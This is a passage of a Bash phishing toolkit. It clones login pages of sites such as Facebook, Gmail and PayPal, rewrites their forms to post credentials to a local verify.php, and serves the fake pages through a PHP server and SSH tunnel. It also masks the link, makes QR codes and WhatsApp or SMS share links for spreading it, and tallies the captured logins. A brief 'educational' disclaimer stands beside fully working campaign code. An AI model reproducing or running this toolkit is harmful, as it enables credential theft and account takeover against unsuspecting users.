        echo -e "\n${COLORS[INFO]}QR Code:${COLORS[RESET]}"
        qrencode -t ANSIUTF8 -m 2 -s 3 "$masked_url"
    fi
    
    echo -e "\n${COLORS[SUCCESS]}[✓] Masked URL saved. Returning to campaign monitor...${COLORS[RESET]}"
    read -p "Press ENTER to continue..."
    return 0
}

# ===== MENÚ DE DISTRIBUCIÓN =====
distribution_menu() {
    local url_to_send=""
    
    if [[ -f "$LOGS_DIR/masked_url.txt" ]]; then
        url_to_send=$(cat "$LOGS_DIR/masked_url.txt")
    elif [[ -f "$LOGS_DIR/current_url.txt" ]]; then
        url_to_send=$(cat "$LOGS_DIR/current_url.txt")
    else
        echo -e "${COLORS[ERROR]}[!] No URL available${COLORS[RESET]}"
        return
    fi
    
    echo -e "\n${COLORS[MENU]}${COLORS[BOLD]}╔════════════════════════════════════╗"
    echo -e "║       DISTRIBUTION OPTIONS         ║"
    echo -e "╚════════════════════════════════════╝${COLORS[RESET]}\n"
    
    echo -e "${COLORS[INFO]}URL: ${COLORS[SUCCESS]}$url_to_send${COLORS[RESET]}\n"
    
    echo -e "${COLORS[INFO]}1) 📋 Copy to Clipboard"
    echo -e "2) 🔲 Generate QR Code"
    echo -e "3) 📱 WhatsApp Share Link"
    echo -e "4) 💬 SMS Share Link"
    echo -e "5) ⬅️ Back${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select [1-5]: "${COLORS[RESET]})" method
    
    case $method in
        1)
            if command -v xclip &> /dev/null; then
                echo -n "$url_to_send" | xclip -selection clipboard
                echo -e "${COLORS[SUCCESS]}[✓] Copied to clipboard!${COLORS[RESET]}"
            else
                echo -e "${COLORS[WARNING]}Manual copy: $url_to_send${COLORS[RESET]}"
            fi
            ;;
        2) qrencode -t ANSIUTF8 -m 2 -s 4 "$url_to_send" ;;
        3) echo -e "${COLORS[SUCCESS]}WhatsApp: https://wa.me/?text=Test:%20${url_to_send//:/%3A}${COLORS[RESET]}" ;;
        4) echo -e "${COLORS[SUCCESS]}SMS: sms:?body=Test:%20${url_to_send//:/%3A}${COLORS[RESET]}" ;;
        5) return ;;
        *) echo -e "${COLORS[ERROR]}Invalid option${COLORS[RESET]}" ;;
    esac
    
    read -p "$(echo -e ${COLORS[INPUT]}"Press ENTER to continue..."${COLORS[RESET]})"
}

# ===== VISUALIZAR CAPTURAS =====
view_captures() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                  CAPTURE VIEWER                               ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${COLORS[RESET]}\n"
    
    local total_captures=0
    local any_found=false
    
    for dir in "$CAPTURES_DIR"/*/; do
        if [[ -d "$dir" ]]; then
            local platform_code=$(basename "$dir")
            local txt_count=$(find "$dir" -name "*.txt" 2>/dev/null | wc -l)
            
            if [[ $txt_count -gt 0 ]]; then
                any_found=true
                total_captures=$((total_captures + txt_count))
                echo -e "${COLORS[SUCCESS]}[$platform_code]${COLORS[RESET]} $txt_count captures"
                
                # Verificar confirmados
                if [[ -f "$dir/CONFIRMED_SUMMARY.txt" ]]; then
                    local confirmed=$(grep -c "✅" "$dir/CONFIRMED_SUMMARY.txt" 2>/dev/null || echo "0")
                    echo -e "      └─ Confirmed: ${COLORS[WARNING]}$confirmed${COLORS[RESET]}"
                fi
                
                # Verificar recovery
                if [[ -f "$dir/RECOVERY_SUMMARY.txt" ]]; then
                    local recovery=$(grep -c "✅" "$dir/RECOVERY_SUMMARY.txt" 2>/dev/null || echo "0")
                    echo -e "      └─ Recovery: ${COLORS[INFO]}$recovery${COLORS[RESET]}"
                fi
            fi
        fi
    done
    
    if [[ "$any_found" == false ]]; then
        echo -e "${COLORS[WARNING]}[!] No captures found yet.${COLORS[RESET]}"
    else
        echo -e "\n${COLORS[BANNER]}Total captures: ${COLORS[SUCCESS]}$total_captures${COLORS[RESET]}"
    fi
    
    read -p "$(echo -e ${COLORS[INPUT]}"Press ENTER to continue..."${COLORS[RESET]})"
}

# ===== LIMPIAR CAPTURAS (DINÁMICO) =====
clean_captures() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                  CLEAN OLD CAPTURES                           ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${COLORS[RESET]}\n"
    
    echo -e "${COLORS[WARNING]}[!] This will delete captures older than 7 days${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Current captures:${COLORS[RESET]}\n"
    
    for dir in "$CAPTURES_DIR"/*/; do
        if [[ -d "$dir" ]]; then
            local platform_code=$(basename "$dir")
            local count=$(find "$dir" -name "*.txt" 2>/dev/null | wc -l)
            if [[ $count -gt 0 ]]; then
                echo -e "  ${COLORS[SUCCESS]}[$platform_code]${COLORS[RESET]} $count files"
            fi
        fi
    done
    
    echo ""
    read -p "Continue? [y/N]: " confirm
    
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        local deleted=0
        for dir in "$CAPTURES_DIR"/*/; do
            if [[ -d "$dir" ]]; then
                deleted=$((deleted + $(find "$dir" -name "*.txt" -mtime +7 -delete -print 2>/dev/null | wc -l)))
            fi
        done
        echo -e "${COLORS[SUCCESS]}[✓] Deleted $deleted old capture(s)${COLORS[RESET]}"
    else
        echo -e "${COLORS[INFO]}[*] Cancelled${COLORS[RESET]}"
    fi
    
    read -p "$(echo -e ${COLORS[INPUT]}"Press ENTER to continue..."${COLORS[RESET]})"
}

# ===== LIMPIEZA =====
cleanup() {
    echo -e "\n${COLORS[INFO]}[*] Cleaning up...${COLORS[RESET]}"
    
    [[ -n "$PHP_PID" ]] && kill $PHP_PID 2>/dev/null
    [[ -n "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null
    lsof -ti:$SELECTED_PORT 2>/dev/null | xargs kill 2>/dev/null
    
    echo -e "${COLORS[SUCCESS]}[✓] Cleanup complete${COLORS[RESET]}"
}

# ===== CLONADOR HÍBRIDO (BASH + PYTHON) =====
clone_website() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║              HYBRID INTELLIGENT CLONER                        ║
║         Bash + Python - Clones ANY website                    ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    echo -e "\n${COLORS[WARNING]}⚠️ Educational Note:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}This tool demonstrates how easily legitimate websites can be cloned.${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Use only on websites you own or have permission to test.${COLORS[RESET]}\n"
    
    # Paso 1: Obtener URL
    read -p "$(echo -e ${COLORS[INPUT]}"Enter target URL: "${COLORS[RESET]})" target_url
    if [[ -z "$target_url" ]]; then
        echo -e "${COLORS[ERROR]}[✗] URL cannot be empty${COLORS[RESET]}"
        read -p "Press ENTER to continue..."
        return 1
    fi
    
    if [[ ! "$target_url" =~ ^https?:// ]]; then
        target_url="https://$target_url"
    fi
    
    # Paso 2: Detectar plataforma automáticamente
    local domain=$(echo "$target_url" | awk -F'/' '{print $3}' | sed 's/^www\.//')
    local detected_platform=""
    
    case "$domain" in
        *facebook*|*fb.com*) detected_platform="facebook" ;;
        *instagram*) detected_platform="instagram" ;;
        *tiktok*) detected_platform="tiktok" ;;
        *google*|*gmail*) detected_platform="gmail" ;;
        *twitter*|*x.com*) detected_platform="twitter" ;;
        *netflix*) detected_platform="netflix" ;;
        *github*) detected_platform="github" ;;
        *linkedin*) detected_platform="linkedin" ;;
        *discord*) detected_platform="discord" ;;
        *spotify*) detected_platform="spotify" ;;
        *twitch*) detected_platform="twitch" ;;
        *reddit*) detected_platform="reddit" ;;
        *messenger*) detected_platform="messenger" ;;
        *outlook*|*live.com*) detected_platform="outlook" ;;
        *yahoo*) detected_platform="yahoo" ;;
        *amazon*) detected_platform="amazon" ;;
        *apple*) detected_platform="apple" ;;
        *paypal*) detected_platform="paypal" ;;
        *dropbox*) detected_platform="dropbox" ;;
        *pinterest*) detected_platform="pinterest" ;;
        *snapchat*) detected_platform="snapchat" ;;
        *telegram*) detected_platform="telegram" ;;
        *whatsapp*) detected_platform="whatsapp" ;;
        *) detected_platform=$(echo "$domain" | cut -d. -f1) ;;
    esac
    
    echo -e "${COLORS[INFO]}[*] Detected platform: ${COLORS[SUCCESS]}$detected_platform${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Confirm platform name [default: $detected_platform]: "${COLORS[RESET]})" platform_name
    if [[ -z "$platform_name" ]]; then
        platform_name="$detected_platform"
    fi
    
    platform_name=$(echo "$platform_name" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
    local clone_dir="$SITES_DIR/$platform_name"
    local platform_code=$(echo "$platform_name" | cut -c1-3 | tr '[:lower:]' '[:upper:]')
    
    # Verificar si ya existe
    if [[ -d "$clone_dir" ]]; then
        echo -e "${COLORS[WARNING]}[!] Directory already exists: $clone_dir${COLORS[RESET]}"
        read -p "Overwrite? [y/N]: " overwrite
        if [[ ! "$overwrite" =~ ^[Yy]$ ]]; then
            return 1
        fi
        rm -rf "$clone_dir"
    fi
    
    mkdir -p "$clone_dir"
    mkdir -p "$CAPTURES_DIR/$platform_code"
    
    echo -e "\n${COLORS[INFO]}[*] Target: $target_url${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}[*] Platform: $platform_name${COLORS[RESET]}"
    
    # ===== VERIFICAR SI PYTHON ESTÁ DISPONIBLE =====
    local use_python=false
    local py_cloner="$MODULES_DIR/cloner.py"
    
    if [[ -f "$py_cloner" ]] && command -v python3 &> /dev/null; then
        # Verificar dependencias Python
        if python3 -c "import requests, bs4" 2>/dev/null; then
            use_python=true
            echo -e "${COLORS[SUCCESS]}[✓] Python cloner available${COLORS[RESET]}"
        else
            echo -e "${COLORS[WARNING]}[!] Python modules missing. Using Bash fallback.${COLORS[RESET]}"
            echo -e "${COLORS[INFO]}[*] Run: pip3 install requests beautifulsoup4 selenium webdriver-manager${COLORS[RESET]}"
        fi
    else
        echo -e "${COLORS[WARNING]}[!] Python cloner not found. Using Bash fallback.${COLORS[RESET]}"
    fi
    
    # ===== EJECUTAR CLONADOR =====
    if [[ "$use_python" == true ]]; then
        echo -e "\n${COLORS[INFO]}[*] Running Python intelligent cloner...${COLORS[RESET]}"
        
        # Preguntar si usar Selenium (para SPAs)
        read -p "$(echo -e ${COLORS[INPUT]}"Use Selenium for JavaScript rendering? [Y/n]: "${COLORS[RESET]})" use_selenium
        local selenium_flag=""
        if [[ ! "$use_selenium" =~ ^[Nn]$ ]]; then
            selenium_flag=""
        else
            selenium_flag="--no-selenium"
        fi
        
        # Ejecutar cloner.py
        python3 "$py_cloner" --url "$target_url" --name "$platform_name" --output "$clone_dir" $selenium_flag
        
        if [[ $? -eq 0 ]]; then
            echo -e "${COLORS[SUCCESS]}[✓] Python cloner completed successfully${COLORS[RESET]}"
        else
            echo -e "${COLORS[ERROR]}[✗] Python cloner failed${COLORS[RESET]}"
            echo -e "${COLORS[INFO]}[*] Falling back to Bash template...${COLORS[RESET]}"
            create_template_for_platform "$clone_dir" "$platform_name"
            create_verify_php "$clone_dir" "$platform_name" "$platform_code"
            create_recovery_php "$clone_dir" "$platform_name" "$platform_code"
        fi
    else
        echo -e "\n${COLORS[INFO]}[*] Using Bash cloner...${COLORS[RESET]}"
        
        # Intentar clonado estático primero
        if clone_static_site "$target_url" "$clone_dir" "$platform_name"; then
            echo -e "${COLORS[SUCCESS]}[✓] Static clone completed${COLORS[RESET]}"
        else
            echo -e "${COLORS[WARNING]}[!] Static clone failed, using template...${COLORS[RESET]}"
            create_template_for_platform "$clone_dir" "$platform_name"
        fi
        
        create_verify_php "$clone_dir" "$platform_name" "$platform_code"
        create_recovery_php "$clone_dir" "$platform_name" "$platform_code"
    fi
    
    # ===== PERMISOS =====
    chmod 644 "$clone_dir"/* 2>/dev/null
    chmod 755 "$clone_dir" 2>/dev/null
    
    # ===== RESUMEN =====
    echo -e "\n${COLORS[BANNER]}${COLORS[BOLD]}═══════════════════════════════════════════════════════════"
    echo -e "                    ✅ CLONE COMPLETED"
    echo -e "═══════════════════════════════════════════════════════════${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}Platform: $platform_name${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}Location: $clone_dir${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}Method: $([ "$use_python" == true ] && echo "Python (Intelligent)" || echo "Bash (Template)")${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}Capture folder: captures/$platform_code/${COLORS[RESET]}"
    
    echo -e "\n${COLORS[INFO]}Files created:${COLORS[RESET]}"
    ls -la "$clone_dir" | grep -E "\.(html|php)$" | while read line; do
        echo -e "  ${COLORS[SUCCESS]}[✓]${COLORS[RESET]} $(echo $line | awk '{print $9}')"
    done
    
    echo -e "\n${COLORS[MENU]}Start a campaign with this platform now? [Y/n]${COLORS[RESET]}"
    read -p "" start_now
    if [[ "$start_now" =~ ^[Yy]?$ ]]; then
        TARGET_SITE="$platform_name"
        start_campaign
    else
        read -p "Press ENTER to continue..."
    fi
}

# ===== CLONADOR ESTÁTICO (BASH) =====
clone_static_site() {
    local url=$1
    local dir=$2
    local name=$3
    
    cd "$dir"
    
    echo -e "${COLORS[INFO]}[*] Downloading static page...${COLORS[RESET]}"
    
    # Intentar con wget
    wget --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         --no-check-certificate \
         --timeout=15 \
         --tries=2 \
         -q \
         -O "index.html" \
         "$url" 2>/dev/null
    
    # Si falla, intentar con curl
    if [[ ! -s "index.html" ]]; then
        curl -s -L -A "Mozilla/5.0" -o "index.html" "$url" 2>/dev/null
    fi
    
    if [[ -s "index.html" ]]; then
        # Verificar si es un SPA (sin contenido real)
        if grep -qE '<div id="(root|app|__next|app-mount)">|<noscript>You need to enable JavaScript' "index.html" 2>/dev/null; then
            echo -e "${COLORS[WARNING]}[!] SPA detected - static clone will have limited functionality${COLORS[RESET]}"
            cd "$SCRIPT_DIR"
            return 1
        fi
        
        # Modificar formulario
        sed -i 's|action="[^"]*"|action="verify.php"|g' index.html 2>/dev/null
        
        if ! grep -q 'name="platform"' index.html 2>/dev/null; then
            sed -i '/<form[^>]*>/a\    <input type="hidden" name="platform" value="'"$name"'">' index.html 2>/dev/null
        fi
        
        if ! grep -q 'name="attempt"' index.html 2>/dev/null; then
            sed -i '/<form[^>]*>/a\    <input type="hidden" name="attempt" id="attemptInput" value="1">' index.html 2>/dev/null
        fi
        
        echo -e "${COLORS[SUCCESS]}[✓] Static site cloned and modified${COLORS[RESET]}"
        cd "$SCRIPT_DIR"
        return 0
    else
        echo -e "${COLORS[ERROR]}[✗] Failed to download${COLORS[RESET]}"
        cd "$SCRIPT_DIR"
        return 1
    fi
}

# ===== INICIAR CAMPAÑA =====
start_campaign() {
    select_target_site
    select_deployment_mode
    configure_port
    init_capture_system
    
    if ! start_php_server; then
        echo -e "${COLORS[ERROR]}[✗] Cannot continue without PHP server${COLORS[RESET]}"
        return 1
    fi
    
    if [[ "$DEPLOYMENT_MODE" == "tunnel" ]]; then
        if start_ssh_tunnel; then
            url_masking_menu
            
            echo -e "\n${COLORS[MENU]}Open distribution menu? [Y/n]${COLORS[RESET]}"
            read -p "" dist_choice
            [[ "$dist_choice" =~ ^[Yy]?$ ]] && distribution_menu
        else
            echo -e "${COLORS[WARNING]}[!] Tunnel failed. Running in local mode.${COLORS[RESET]}"
            DEPLOYMENT_MODE="local"
        fi
    fi
    
    echo -e "\n${COLORS[BANNER]}${COLORS[BOLD]}═══════════════════════════════════════════════════════════"
    echo -e "                    🎯 CAMPAIGN ACTIVE"
    echo -e "═══════════════════════════════════════════════════════════${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Platform:${COLORS[RESET]} $TARGET_SITE"
    echo -e "${COLORS[INFO]}Mode:${COLORS[RESET]} $DEPLOYMENT_MODE"
    echo -e "${COLORS[INFO]}Port:${COLORS[RESET]} $SELECTED_PORT"
    
    [[ -f "$LOGS_DIR/current_url.txt" ]] && echo -e "${COLORS[INFO]}Tunnel:${COLORS[RESET]} $(cat $LOGS_DIR/current_url.txt)"
    [[ -f "$LOGS_DIR/masked_url.txt" ]] && echo -e "${COLORS[INFO]}Masked:${COLORS[RESET]} $(cat $LOGS_DIR/masked_url.txt)"
    
    echo -e "\n${COLORS[WARNING]}Press ENTER to stop the campaign...${COLORS[RESET]}"
    read -p ""
    cleanup
}

start_campaign() {
    if ! select_target_site; then
        return 1
    fi
    
    select_deployment_mode
    configure_port
    init_capture_system
    
    if ! start_php_server; then
        echo -e "${COLORS[ERROR]}[✗] Cannot continue without PHP server${COLORS[RESET]}"
        return 1
    fi
    
    if [[ "$DEPLOYMENT_MODE" == "tunnel" ]]; then
        if start_ssh_tunnel; then
            url_masking_menu
            
            echo -e "\n${COLORS[MENU]}Open distribution menu? [Y/n]${COLORS[RESET]}"
            read -p "" dist_choice
            [[ "$dist_choice" =~ ^[Yy]?$ ]] && distribution_menu
        else
            echo -e "${COLORS[WARNING]}[!] Tunnel failed. Running in local mode.${COLORS[RESET]}"
            DEPLOYMENT_MODE="local"
        fi
    fi
    
    echo -e "\n${COLORS[BANNER]}${COLORS[BOLD]}═══════════════════════════════════════════════════════════"
    echo -e "                    🎯 CAMPAIGN ACTIVE"
    echo -e "═══════════════════════════════════════════════════════════${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Platform:${COLORS[RESET]} $TARGET_SITE"
    echo -e "${COLORS[INFO]}Mode:${COLORS[RESET]} $DEPLOYMENT_MODE"
    echo -e "${COLORS[INFO]}Port:${COLORS[RESET]} $SELECTED_PORT"
    
    [[ -f "$LOGS_DIR/current_url.txt" ]] && echo -e "${COLORS[INFO]}Tunnel:${COLORS[RESET]} $(cat $LOGS_DIR/current_url.txt)"
    [[ -f "$LOGS_DIR/masked_url.txt" ]] && echo -e "${COLORS[INFO]}Masked:${COLORS[RESET]} $(cat $LOGS_DIR/masked_url.txt)"
    
    echo -e "\n${COLORS[WARNING]}Press ENTER to stop the campaign...${COLORS[RESET]}"
    read -p ""
    cleanup
}

# ===== MENÚ PRINCIPAL =====
show_main_menu() {
    while true; do
        clear
        echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
        echo "╔════════════════════════════════════╗"
        echo "║           MAIN MENU                ║"
        echo "╚════════════════════════════════════╝"
        echo -e "${COLORS[RESET]}\n"
        
        echo -e "${COLORS[INFO]}1) 🚀 Start New Campaign"
        echo -e "2) 📊 View Captures"
        echo -e "3) 🧹 Clean Old Captures"
        echo -e "4) 🤖 Clone Website"
        echo -e "5) 🚪 Exit${COLORS[RESET]}"
        
        read -p "$(echo -e ${COLORS[INPUT]}"Select [1-5]: "${COLORS[RESET]})" menu_option
        
        case $menu_option in
            1) start_campaign ;;
            2) view_captures ;;
            3) clean_captures ;;
            4) clone_website ;;
            5) echo -e "${COLORS[SUCCESS]}Goodbye!${COLORS[RESET]}"; exit 0 ;;
            *) echo -e "${COLORS[ERROR]}Invalid option${COLORS[RESET]}"; sleep 1 ;;
        esac
    done
}

# ===== MAIN =====
main() {
    trap cleanup SIGINT SIGTERM
    
    show_banner
    load_config
    check_dependencies
    show_main_menu
}

main "$@"
